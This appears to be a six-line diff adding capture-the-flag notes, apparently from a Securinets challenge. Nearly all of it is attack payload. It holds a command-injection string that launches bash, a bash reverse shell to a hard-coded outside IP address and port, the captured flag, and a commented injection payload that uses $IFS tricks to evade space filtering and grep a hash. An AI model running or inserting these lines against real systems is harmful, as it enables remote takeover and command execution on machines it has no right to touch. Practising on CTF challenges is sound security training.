@@ -1,0 +1,6 @@
+';/bin/bash'
+bash -i >& /dev/tcp/51.68.122.93/1339 0>&1
+securinets{memcmp_turned_out_to_be_shame_shame_shame!!}
+
+# grep the hash and output it
+# ';grep$IFS-ahz${IFS}3b$IFS*;'
